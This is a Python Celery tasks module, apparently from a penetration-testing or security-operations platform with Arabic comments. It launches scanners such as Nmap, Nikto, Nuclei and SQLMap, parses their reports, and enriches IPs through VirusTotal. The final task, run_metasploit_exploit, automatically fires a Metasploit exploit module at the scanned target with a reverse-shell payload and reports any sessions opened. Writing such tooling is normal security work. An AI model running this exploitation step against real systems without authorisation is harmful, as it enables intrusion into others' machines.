# core/tasks.py

import subprocess
import json
import os
from celery import shared_task
from django.utils import timezone
import requests
from django.conf import settings
from .models import Scan, Vulnerability, Alert, ActionLog, Playbook, Tool
import glob
import shutil # <-- مكتبة جديدة لحذف المجلدات
from pymetasploit3.msfrpc import MsfRpcClient # <-- استيراد المكتبة

@shared_task
def execute_scan_task(scan_id):
    """
    مهمة Celery عامة تقوم بتشغيل أي أداة فحص معرفة في قاعدة البيانات.
    """
    try:
        scan = Scan.objects.get(id=scan_id)
        tool = scan.tool
    except (Scan.DoesNotExist, Tool.DoesNotExist):
        print(f"ERROR: Scan or Tool not found for scan_id {scan_id}.")
        return f"Scan or Tool not found for scan_id {scan_id}."

    scan.status = 'RUNNING'
    scan.save()
    
    # --- تعديل: تحديد مسار الإخراج (قد يكون ملفًا أو مجلدًا) ---
    # نستخدم /tmp/ لأنه مسار قياسي للملفات المؤقتة في لينكس
    output_path = f"/tmp/scan_report_{scan.id}"
    
    # بناء الأمر ديناميكيًا من القالب
    command_str = tool.command_template.format(target=scan.target_url, output=output_path)
    command_args = command_str.split()

    result_message = ""
    print(f"Executing command for scan {scan.id}: {' '.join(command_args)}")

    try:
        # تنفيذ الأمر
        result = subprocess.run(
            command_args, 
            check=True,
            timeout=3600, # مهلة ساعة كاملة للفحوصات الطويلة مثل sqlmap
            capture_output=True,
            text=True
        )
        print(f"[{tool.name} Scan {scan.id}] STDOUT:\n{result.stdout}")
        print(f"[{tool.name} Scan {scan.id}] STDERR:\n{result.stderr}")

        # --- توسيع منطق التحليل ليشمل كل الأدوات ---
        if tool.name == 'Nikto':
            parse_nikto_json(scan, output_path)
        elif tool.name == 'Nmap':
            parse_nmap_text(scan, output_path)
        elif tool.name == 'dirsearch':
            parse_dirsearch_report(scan, output_path)
        elif tool.name == 'Nuclei':
            parse_nuclei_jsonl(scan, output_path)
        elif tool.name == 'SQLMap':
            parse_sqlmap_output(scan, output_path) # <-- إضافة جديدة
        
        scan.status = 'COMPLETED'
        result_message = f"{tool.name} scan for {scan.target_url} completed successfully."

    except subprocess.CalledProcessError as e:
        scan.status = 'FAILED'
        result_message = f"{tool.name} process failed. Check worker logs for details."
        print(f"ERROR for scan {scan.id}: {tool.name} failed with exit code {e.returncode}")
        print(f"STDERR from tool:\n{e.stderr}")
    except subprocess.TimeoutExpired:
        scan.status = 'FAILED'
        result_message = "Scan timed out after 1 hour."
    except Exception as e:
        scan.status = 'FAILED'
        result_message = f"An unexpected error occurred: {str(e)}"
        print(f"UNEXPECTED ERROR for scan {scan.id}: {str(e)}")
    
    finally:
        scan.completed_at = timezone.now()
        scan.save()
        
        # --- تعديل: منطق تنظيف محسن للملفات والمجلدات ---
        if os.path.isdir(output_path):
            shutil.rmtree(output_path) # حذف المجلد وكل محتوياته
        elif os.path.exists(output_path):
            os.remove(output_path) # حذف الملف فقط

    print(result_message)
    return result_message

# --- دوال مساعدة لتحليل مخرجات الأدوات ---

def parse_nikto_json(scan, file_path):
    """
    تحلل تقرير Nikto بصيغة JSON، مع معالجة التنسيقات المختلفة.
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Nikto report file not found or is empty: {file_path}")
        return

    with open(file_path, 'r') as f:
        try:
            report_data = json.load(f)
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Nikto report: {file_path}")
            # يمكنك هنا إضافة منطق لقراءة الملف كنص عادي وتسجيله
            return

    # --- منطق ذكي للتعامل مع التنسيقات المختلفة ---
    hosts = []
    if isinstance(report_data, dict):
        # التنسيق القياسي والناجح
        hosts = report_data.get('hosts', [])
    elif isinstance(report_data, list):
        # حالة خاصة قد تحدث عند وجود أخطاء
        # نفترض أن كل عنصر في القائمة هو تقرير مضمن
        hosts = report_data

    if not hosts:
        print(f"No 'hosts' found in Nikto report for scan {scan.id}")
        return
    # ----------------------------------------------
        
    for host_report in hosts:
        # التأكد من أن host_report هو قاموس قبل استخدام .get()
        if not isinstance(host_report, dict):
            continue

        for vuln in host_report.get('vulnerabilities', []):
            Vulnerability.objects.create(
                scan=scan, 
                description=vuln.get('description', 'No description provided.'), 
                severity=vuln.get('id', 'N/A'), 
                details=vuln
            )

def parse_nmap_text(scan, file_path):
    """
    تحلل تقرير Nmap النصي (مخرجات -oN) وتنشئ سجلات للبورتات المفتوحة.
    """
    if not os.path.exists(file_path):
        print(f"Nmap report file not found: {file_path}")
        return
        
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            # البحث عن الأسطر التي تحتوي على بورت مفتوح
            if '/tcp' in line and 'open' in line:
                parts = [p for p in line.split() if p] # تقسيم السطر وإزالة المسافات الزائدة
                if len(parts) >= 3:
                    port = parts[0]
                    service = " ".join(parts[2:])
                    Vulnerability.objects.create(
                        scan=scan, 
                        description=f"Open Port: {port} - Service: {service}",
                        severity="Informational", 
                        details={'port': port, 'service': service, 'raw_line': line}
                    )

# --- مهمة إثراء البيانات من VirusTotal ---

@shared_task
def enrich_ip_with_virustotal(alert_id, playbook_id):
    """
    Celery task لإغناء عنوان IP باستخدام VirusTotal API.
    """
    try:
        alert = Alert.objects.get(id=alert_id)
        playbook = Playbook.objects.get(id=playbook_id)
    except (Alert.DoesNotExist, Playbook.DoesNotExist):
        return f"Alert or Playbook not found."

    if not alert.source_ip:
        details = "Playbook failed: Alert has no source IP address."
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details

    ip_address = alert.source_ip
    api_key = settings.VIRUSTOTAL_API_KEY
    url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip_address}"
    headers = {"x-apikey": api_key}
    details = ""

    try:
        response = requests.get(url, headers=headers, timeout=20)
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        
        stats = data.get('last_analysis_stats', {})
        details = (
            f"VirusTotal analysis for {ip_address}:\n"
            f"- Malicious: {stats.get('malicious', 0)}, Suspicious: {stats.get('suspicious', 0)}\n"
            f"- Country: {data.get('country', 'N/A')}\n"
            f"- Owner: {data.get('as_owner', 'N/A')}"
        )
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return f"Successfully enriched IP {ip_address}."

    except requests.RequestException as e:
        details = f"VirusTotal API request failed for IP {ip_address}. Error: {str(e)}"
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details
    
def parse_dirsearch_report(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            # النتائج الحقيقية لا تبدأ بـ '#'
            if line.strip() and not line.startswith('#'):
                # السطر عادة ما يكون: [TIME] STATUS SIZE --> URL
                parts = line.split('-->')
                if len(parts) > 1:
                    url = parts[1].strip()
                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Discovered Path: {url}",
                        severity="Informational",
                        details={'raw_line': line.strip()}
                    )
                    
# --- إضافة جديدة: دالة تحليل لـ Nuclei ---
def parse_nuclei_jsonl(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            try:
                data = json.loads(line)
                info = data.get('info', {})
                Vulnerability.objects.create(
                    scan=scan,
                    description=info.get('name', 'No description provided.'),
                    severity=info.get('severity', 'unknown').capitalize(),
                    cve_id=", ".join(info.get('classification', {}).get('cve-id', [])),
                    details=data
                )
            except json.JSONDecodeError:
                continue # تجاهل أي أسطر غير صالحة
            
            

# --- إضافة جديدة: دالة تحليل لـ SQLMap ---
def parse_sqlmap_output(scan, output_dir):
    """
    تحلل مخرجات sqlmap من مجلد النتائج.
    """
    # sqlmap ينشئ مجلدًا للهدف، وبداخله ملف 'log'
    # المسار سيكون شيئًا مثل: /tmp/scan_report_XX/testphp.vulnweb.com/log
    log_file_path = glob.glob(os.path.join(output_dir, '*', 'log'))

    if not log_file_path:
        print(f"SQLMap log file not found in {output_dir}")
        return

    with open(log_file_path[0], 'r') as f:
        content = f.read()
        # نبحث عن علامات تدل على وجود ثغرة
        if "Parameter:" in content and "Type:" in content and "Payload:" in content:
            # يمكننا جعل هذا التحليل أكثر ذكاءً لاستخراج تفاصيل الثغرة
            Vulnerability.objects.create(
                scan=scan,
                description="Potential SQL Injection vulnerability found.",
                severity="Critical",
                details={'log_content': content[:2000]} # حفظ أول 2000 حرف من السجل
            )


@shared_task
def run_metasploit_exploit(vuln_id):
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return f"Vulnerability {vuln_id} not found."

    # --- الاتصال بخدمة Metasploit ---
    # تذكر استبدال 'your_strong_password' بكلمة المرور التي اخترتها
    try:
        client = MsfRpcClient('your_strong_password', server='127.0.0.1', port=55553)
    except Exception as e:
        # لا يوجد سجل ActionLog هنا لأننا لا نملك كائن Alert
        print(f"Failed to connect to Metasploit RPC: {e}")
        return f"Failed to connect to Metasploit RPC: {e}"

    try:
        exploit = client.modules.use('exploit', vuln.metasploit_module)
        
        # تعيين الهدف
        exploit['RHOSTS'] = vuln.scan.target_url
        
        # يمكنك هنا تعيين خيارات أخرى إذا لزم الأمر، مثل RPORT
        
        # تنفيذ الاستغلال
        result = exploit.execute(payload='generic/shell_reverse_tcp')

        # التحقق من النتيجة
        if result and result.get('job_id') is not None:
            # يمكننا التحقق من قائمة الجلسات (sessions) لتأكيد النجاح
            sessions = client.sessions.list
            if sessions:
                details = f"Metasploit exploit successful! Session opened: {sessions}"
                print(details)
            else:
                details = "Metasploit exploit executed, but no session was created."
        else:
            details = "Metasploit exploit failed to execute."

        # ملاحظة: لا يوجد ActionLog هنا، يمكن إضافة سجل مخصص لاحقًا
        return details

    except Exception as e:
        return f"An error occurred during exploit execution: {str(e)}"